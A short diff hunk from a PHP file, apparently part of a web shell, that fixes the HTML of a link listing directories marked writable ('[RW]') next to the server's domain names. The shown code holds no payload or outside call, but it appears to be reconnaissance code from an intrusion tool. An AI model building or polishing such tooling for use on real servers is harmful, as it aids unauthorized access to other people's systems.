@@ -1283,7 +1283,7 @@ $i = 0;
 					$status = "<font color='green'>[RW]</font>";
 				}
 				$i++;
-				print "$status <a href='?dir=$path'> style='cyan'>".$path."</a>";
+				print "$status <a href='?dir=".$path."' style='color: cyan;'>".$path."</a>";
 				if(!function_exists('posix_getpwuid')) print "<br>";
 				if(!getdomainname()) print " => <font color='red'>Can't get domain name</font><br>";
 				foreach(getdomainname() as $domain) {
